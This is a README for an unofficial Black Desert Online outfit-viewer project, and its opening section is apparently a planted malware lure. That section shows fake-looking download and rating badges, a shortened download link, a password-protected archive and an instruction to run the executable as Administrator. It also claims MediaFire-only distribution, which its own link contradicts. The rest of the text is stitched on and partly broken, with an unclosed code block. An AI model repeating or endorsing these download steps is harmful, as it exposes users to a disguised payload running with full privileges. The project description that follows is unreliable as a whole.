<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <img src="docs/images/logo.svg" width="72" height="72" alt="BDO Wardrobe mark">
</p>

<h1 align="center">BDO Wardrobe</h1>

<p align="center"><strong>A gallery-first outfit viewer for Black Desert Online.</strong></p>

<p align="center">
  Browse <strong>4,343 outfits across 32 classes and 11 outfit boxes</strong>, with honest<br>
  image-quality badges, instant search, favorites / owned / wishlist tracking,<br>
  outfit-box value views, side-by-side comparison, and a shareable wardrobe export.
</p>

<p align="center">
## What you get

- **4,343 outfits** — the full Pearl Shop catalog in this tree: every class, every box, including the Agent class launch roster
- **Honest badges, never faked** — every preview is labeled by what it actually is: `Official` / `HQ` / `Standard` / `Upscaled` / `Fallback` / `Missing`, derived from measured pixel dimensions plus provenance
- **Sibling fallbacks that admit it** — if a class has no render for an outfit (and one exists in-game), the app borrows the closest gender-matched sibling render and labels it `FALLBACK: <Class>`. Berserker and Shai never borrow or lend — their frames would misrepresent any outfit
- **Instant search and filters** — debounced full-text search over 4,343 cards; filter by class, box, rarity, and image quality
- **Lightbox with metadata** — rarity, provider, source page link, outfit boxes, resolution
- **My Wardrobe** — mark outfits Favorite / Owned / Wishlist, persisted locally; export/import your collection as JSON
- **Compare view** — put two outfits side by side
- **Zero runtime dependencies** — plain Node 22 + vanilla JS. No `npm install` to run the gallery.

<p align="center">
  <img src="docs/screenshot-lightbox.png" alt="Lightbox for Agent Hexround Reaper: official 3840×2160 render with metadata and wardrobe actions" width="100%">
</p>

<p align="center"><sub>Every card tells the truth about its own picture — including borrowed ones.</sub></p>

<p align="center">
  <img src="docs/screenshot-fallback.png" alt="Primavera search: Berserker has no source image; Hashashin shows FALLBACK: CORSAIR" width="100%">
</p>

## Quick start

Node.js 22 or newer.

```powershell
## How images work

Previews live in `public/assets/images/` and are indexed by `data/images.json` (`{id → file, width, height, provider, sourceUrl}`). The catalog is `data/catalog.json` (4,343 outfits, 32 classes, 11 boxes). Both ship in the repo so the app works offline.

Quality tiers are computed from **measured facts only**:

| Tier | Meaning |
| --- | --- |
| `Official` | Pearl Abyss' own product render |
| `HQ` | Measured ≥ 500px on the short side |
| `Standard` | Smaller than HQ but real |
| `Upscaled` | Enlarged from a tiny native thumbnail (blurry at full size) |
| `Fallback` | Borrowed from a gender-matched sibling class |
| `Missing` | No verified image exists yet |

This tree indexes **4,339** images for those 4,343 outfits.

The crawler scripts in `scripts/` can re-fetch or expand the catalog from public sources (mmo-fashion, Altar of Gaming) — see `scripts/*.mjs` headers. They are development tools; the shipped catalog already covers everything they found.

## More views

<p align="center">
  <img src="docs/screenshot-boxes.png" alt="Outfit Boxes view with honest per-box counts, including nested choices marked not in catalog" width="100%">
</p>

<p align="center">
  <img src="docs/screenshot-compare.png" alt="Side-by-side compare view for two outfits" width="100%">
</p>

## Repository layout

```text
server.mjs              static + API server (zero-dep)
launcher.ps1            Windows desktop bootstrap (private runtime)
BDO Wardrobe UI.exe     WebView2 shell
public/                 UI (vanilla JS) + 4,339 previews
data/
  catalog.json          4,343 outfits / 32 classes / 11 boxes
  images.json           image index + quality metadata
lib/                    fetch / matching helpers used by crawler scripts
scripts/                catalog builder, crawler, E2E verify harness
docs/                   real UI screenshots
docs/images/logo.svg    README mark
```

## Verification

`scripts/verify.mjs` is a Playwright end-to-end suite (**13 checks**: boot counts, search, filters, lightbox navigation, favorites persistence, badge honesty, fallback labels, compare, wardrobe). It expects the server running on `127.0.0.1:7861`.

```powershell
node server.mjs
npm ci
npx playwright install chromium
node scripts/verify.mjs
```

CI (`.github/workflows/ci.yml`) runs the suite on every push and pull request: JS syntax, catalog integrity, API boot, Playwright, and an image-budget guard.

## Honest status

Verified in this tree:

- `data/catalog.json` — 4,343 outfits, 32 classes, 11 boxes
- `data/images.json` — 4,339 indexed images
- real UI screenshots under `docs/`
- CI workflow `.github/workflows/ci.yml`
- latest GitHub release **v1.0.0**

Not claimed:

- affiliation with Pearl Abyss
- that `package.json` version `2.0.0` is a GitHub release (it is not; v1.0.0 is the latest tag)
- that every class has a unique official render for every outfit (fallbacks and missing images are labeled on purpose)


---

# Contributing

Thanks for taking the time to contribute! This is a personal, hobby-maintained project, so please be patient with response times.

## Ground rules

- Open an issue first for anything non-trivial — a feature, a refactor, or a bug you plan to fix — so we can agree on the approach before you write a lot of code.
- Keep changes small and focused. One logical change per pull request makes review much easier.
- Match the existing style of the code around you (formatting, naming, structure).

## Bugs and features

1. Search the issues to make sure it hasn't already been reported.
2. Open an issue describing the problem or idea clearly, including how to reproduce bugs.
3. If you want to implement it, say so in the issue and link your pull request to it.

## Pull requests

1. Fork the repo (or push a branch if you have write access).
2. Make your change.
3. If the project has tests or CI, make sure they pass.
4. Open a pull request with a clear title and a description of what and why.
5. Keep the PR scoped; reviewers will ask for changes if something is unclear.

## Security issues

Do **not** report security problems in a public issue. See `SECURITY.md` for how to report privately.

By contributing, you agree that your contributions are licensed under the same license as this project.


---

MIT License

Copyright (c) 2026 ShugokiFable

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

Data notice: outfit catalog data is compiled from public community sources
(mmo-fashion.com, altarofgaming.com) and official Pearl Shop announcements.
Black Desert Online and all related names are trademarks of Pearl Abyss Corp.
This repository is an unofficial fan project and is not affiliated with or
endorsed by Pearl Abyss. No proprietary game assets are redistributed.
